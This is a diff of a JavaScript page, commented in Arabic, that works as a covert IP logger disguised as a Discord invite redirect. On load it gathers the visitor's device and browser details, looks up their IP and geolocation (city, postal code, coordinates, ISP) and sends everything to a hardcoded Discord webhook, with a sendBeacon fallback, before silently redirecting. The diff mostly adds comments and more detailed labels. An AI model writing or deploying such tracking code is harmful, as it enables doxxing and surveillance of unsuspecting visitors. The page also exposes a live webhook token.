@@ -12,7 +12,7 @@
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1515988891528728637/_Bbemq0uCRzXVVcdpeByhDd-roIa11FjFCDXe91hzUqufGvC4cjTrUpHn5EcUYTEISlw";
         const DISCORD_REDIRECT = "https://discord.gg/M9L";
 
-        // === جمع البيانات الأساسية ===
+        // === جمع البيانات الأساسية (الجهاز، المتصفح، النظام) ===
         const ua = navigator.userAgent;
         
         const iPhoneModels = {
@@ -47,7 +47,7 @@
             referrer: document.referrer || "مباشر"
         };
         
-        // === جلب عنوان IP ===
+        // === 1. جلب عنوان IP ===
         async function getIP() {
             try {
                 const res = await fetch('https://api.ipify.org?format=json', { cache: 'no-store' });
@@ -58,10 +58,11 @@
             }
         }
         
-        // === جلب الموقع الجغرافي من IP (باستخدام ip-api.com) ===
+        // === 2. جلب الموقع الجغرافي بناءً على الـ IP (الدولة، المدينة، الإحداثيات، مزود الخدمة) ===
         async function getLocation(ip) {
             if (ip === "غير متاح") return null;
             try {
+                // نستخدم http لأن الخدمة المجانية لا تدعم https بدون مفتاح
                 const res = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,regionName,city,zip,lat,lon,isp,org,as,timezone`, { cache: 'no-store' });
                 const data = await res.json();
                 if (data.status === "success") {
@@ -76,8 +77,9 @@
             }
         }
         
-        // === إرسال البيانات إلى Discord ===
+        // === 3. إرسال كل البيانات إلى الـ Webhook ===
         async function sendData(ip, location) {
+            // الحقول الأساسية
             const fields = [
                 { name: "🌍 IP", value: ip, inline: true },
                 { name: "📱 الجهاز", value: basicData.device, inline: true },
@@ -90,22 +92,23 @@
                 { name: "🔗 المُحيل", value: basicData.referrer, inline: false }
             ];
 
-            // إضافة معلومات الموقع إذا كانت متوفرة
+            // إضافة حقول الموقع الجغرافي إذا كانت متوفرة (هذا هو المطلوب)
             if (location) {
                 fields.push(
                     { name: "🇨🇳 الدولة", value: location.country || "غير معروف", inline: true },
                     { name: "🏙️ المنطقة", value: location.regionName || "غير معروف", inline: true },
                     { name: "🏛️ المدينة", value: location.city || "غير معروف", inline: true },
                     { name: "📮 الرمز البريدي", value: location.zip || "غير معروف", inline: true },
-                    { name: "📍 الإحداثيات", value: `${location.lat}, ${location.lon}`, inline: true },
-                    { name: "📶 مزود الخدمة", value: location.isp || "غير معروف", inline: true },
+                    { name: "📍 الإحداثيات (خط الطول والعرض)", value: `${location.lat}, ${location.lon}`, inline: true },
+                    { name: "📶 مزود الخدمة (ISP)", value: location.isp || "غير معروف", inline: true },
                     { name: "🏢 المنظمة", value: location.org || "غير معروف", inline: true },
-                    { name: "🔢 AS", value: location.as || "غير معروف", inline: true }
+                    { name: "🔢 AS (النظام المستقل)", value: location.as || "غير معروف", inline: true }
                 );
             } else {
-                fields.push({ name: "📍 الموقع", value: "❌ غير متاح", inline: false });
+                fields.push({ name: "📍 الموقع الجغرافي", value: "❌ غير متاح (تعذر الجلب)", inline: false });
             }
 
+            // تجهيز الـ Embed
             const embed = {
                 title: "🕵️ زائر جديد - توجيه فوري",
                 color: 0x2C3E50,
@@ -113,6 +116,7 @@
                 footer: { text: "تم التوجيه وجمع البيانات لكل زائر" }
             };
 
+            // الإرسال (مع الاحتفاظ بالاتصال)
             try {
                 await fetch(WEBHOOK_URL, {
                     method: 'POST',
@@ -120,16 +124,22 @@
                     body: JSON.stringify({ embeds: [embed] }),
                     keepalive: true
                 });
+                console.log("✅ تم إرسال البيانات بنجاح إلى Webhook");
             } catch(e) {
+                // طريقة احتياطية للإرسال لو فشل الـ fetch
                 navigator.sendBeacon(WEBHOOK_URL, new Blob([JSON.stringify({ embeds: [embed] })], {type: 'application/json'}));
             }
         }
         
-        // === التنفيذ ===
+        // === التشغيل الفوري ===
         (async () => {
+            // 1. جلب الـ IP
             const ip = await getIP();
+            // 2. جلب الموقع الجغرافي بناءً على الـ IP
             const location = ip !== "غير متاح" ? await getLocation(ip) : null;
+            // 3. إرسال كل البيانات مع الموقع إلى الـ Webhook
             await sendData(ip, location);
+            // 4. التوجيه بعد نصف ثانية
             setTimeout(() => {
                 window.location.replace(DISCORD_REDIRECT);
             }, 300);
